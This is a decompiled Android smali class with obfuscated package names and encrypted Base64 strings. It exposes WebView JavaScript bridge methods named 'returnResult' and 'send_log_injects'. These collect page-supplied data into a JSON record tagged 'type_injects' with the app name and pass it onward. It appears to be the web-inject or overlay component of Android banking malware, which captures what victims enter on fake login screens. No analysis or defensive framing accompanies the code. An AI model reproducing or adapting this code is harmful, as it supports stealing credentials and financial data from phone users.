.class public final Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;
.super Ljava/lang/Object;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/cisojemopatude/yazi/catozotu/safotehehefu;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x11
    name = "c"
.end annotation


# instance fields
.field public a:Landroid/content/Context;

.field public final synthetic b:Lcom/cisojemopatude/yazi/catozotu/safotehehefu;


# direct methods
.method public constructor <init>(Lcom/cisojemopatude/yazi/catozotu/safotehehefu;Landroid/content/Context;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")V"
        }
    .end annotation

    iput-object p1, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->b:Lcom/cisojemopatude/yazi/catozotu/safotehehefu;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p2, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->a:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public final a(Ljava/lang/String;)V
    .locals 13

    const-string v0, "aVYxMkpnaXBsd0tzMU95aTZVSk16dz09OjpVcnJIeWg3U3E1U1FURERZS2lENjBBPT0="

    const-string v1, "context"

    const-string v2, "type_"

    const-string v3, ""

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v4

    const/4 v5, 0x1

    const/4 v6, 0x0

    if-lez v4, :cond_0

    move v4, v5

    goto :goto_0

    :cond_0
    move v4, v6

    :goto_0
    if-eqz v4, :cond_8

    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    const/4 v7, 0x0

    const/4 v8, 0x4

    :try_start_0
    const-string v9, "application"

    iget-object v10, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->b:Lcom/cisojemopatude/yazi/catozotu/safotehehefu;

    .line 1
    iget-object v10, v10, Lcom/cisojemopatude/yazi/catozotu/safotehehefu;->c:Ljava/lang/String;

    .line 2
    invoke-virtual {v4, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v9, "type_injects"

    iget-object v10, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->a:Landroid/content/Context;

    iget-object v11, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->b:Lcom/cisojemopatude/yazi/catozotu/safotehehefu;

    .line 3
    iget-object v11, v11, Lcom/cisojemopatude/yazi/catozotu/safotehehefu;->c:Ljava/lang/String;

    .line 4
    invoke-static {v2, v11}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    .line 5
    invoke-static {v10, v1}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v12, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v12, :cond_1

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v10, v12, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v10

    sput-object v10, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_1
    sget-object v10, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v10}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v10, v11, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 6
    invoke-virtual {v4, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v9, "data"

    sget-object v10, Lb0/b;->a:Lb0/b;

    .line 7
    sget-object v10, Lb0/b;->M:Ljava/lang/String;

    .line 8
    invoke-static {p1, v10, v3, v6, v8}, Ly0/f;->O(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ZI)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 9
    :catch_0
    sget-object v9, Ls0/c;->d:Landroid/content/SharedPreferences;

    const-string v10, "OFVNK0d1VTBtRGYyLzcwS3pWTlJSQT09Ojo0MHFhZi8yaVdWa2F6VmV5ZUpnM2pRPT0="

    invoke-static {v9, v10, v3}, Landroidx/activity/result/a;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    if-nez v9, :cond_2

    move-object v9, v3

    .line 10
    :cond_2
    iget-object v10, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->b:Lcom/cisojemopatude/yazi/catozotu/safotehehefu;

    .line 11
    iget-object v10, v10, Lcom/cisojemopatude/yazi/catozotu/safotehehefu;->c:Ljava/lang/String;

    .line 12
    invoke-static {v9, v10, v3, v6, v8}, Ly0/f;->O(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ZI)Ljava/lang/String;

    move-result-object v8

    .line 13
    sget-object v9, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v9}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v9}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v9

    const-string v10, "VDU4Yk9kbXMrUDNCOUVHU0lYTGs1UT09Ojo5QlIySzdZRFFmU2lVdFlxVEFoejhBPT0="

    invoke-static {v10, v9, v8}, Lc0/a;->a(Ljava/lang/String;Landroid/content/SharedPreferences$Editor;Ljava/lang/String;)V

    .line 14
    sget-object v8, Lc0/b;->a:Lc0/b;

    iget-object v9, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->b:Lcom/cisojemopatude/yazi/catozotu/safotehehefu;

    .line 15
    iget-object v10, v9, Lcom/cisojemopatude/yazi/catozotu/safotehehefu;->c:Ljava/lang/String;

    .line 16
    invoke-virtual {v4}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v11, "jsonObject.toString()"

    invoke-static {v4, v11}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    iget-object v11, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->a:Landroid/content/Context;

    iget-object v12, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->b:Lcom/cisojemopatude/yazi/catozotu/safotehehefu;

    .line 17
    iget-object v12, v12, Lcom/cisojemopatude/yazi/catozotu/safotehehefu;->c:Ljava/lang/String;

    .line 18
    invoke-static {v2, v12}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .line 19
    invoke-static {v11, v1}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v1, :cond_3

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v11, v0, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    sput-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_3
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v0, v2, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_4

    goto :goto_1

    :cond_4
    move-object v3, v0

    .line 20
    :goto_1
    invoke-virtual {v8, v9, v10, v4, v3}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->b:Lcom/cisojemopatude/yazi/catozotu/safotehehefu;

    .line 21
    iget-object v0, v0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu;->c:Ljava/lang/String;

    .line 22
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_5

    move v0, v5

    goto :goto_2

    :cond_5
    move v0, v6

    :goto_2
    if-eqz v0, :cond_6

    goto :goto_3

    :cond_6
    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 23
    sget-object v0, Lb0/b;->M:Ljava/lang/String;

    const/4 v1, 0x2

    .line 24
    invoke-static {p1, v0, v6, v1}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v0

    if-nez v0, :cond_7

    .line 25
    sget-object v0, Lb0/b;->N:Ljava/lang/String;

    .line 26
    invoke-static {p1, v0, v6, v1}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result p1

    if-eqz p1, :cond_8

    :cond_7
    :goto_3
    iget-object p1, p0, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->b:Lcom/cisojemopatude/yazi/catozotu/safotehehefu;

    .line 27
    iput-boolean v5, p1, Lcom/cisojemopatude/yazi/catozotu/safotehehefu;->e:Z

    .line 28
    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    :cond_8
    return-void
.end method

.method public final returnResult(Ljava/lang/String;)V
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    const-string v0, "data"

    invoke-static {p1, v0}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->a(Ljava/lang/String;)V

    return-void
.end method

.method public final send_log_injects(Ljava/lang/String;)V
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    const-string v0, "data"

    invoke-static {p1, v0}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Lcom/cisojemopatude/yazi/catozotu/safotehehefu$c;->a(Ljava/lang/String;)V

    return-void
.end method
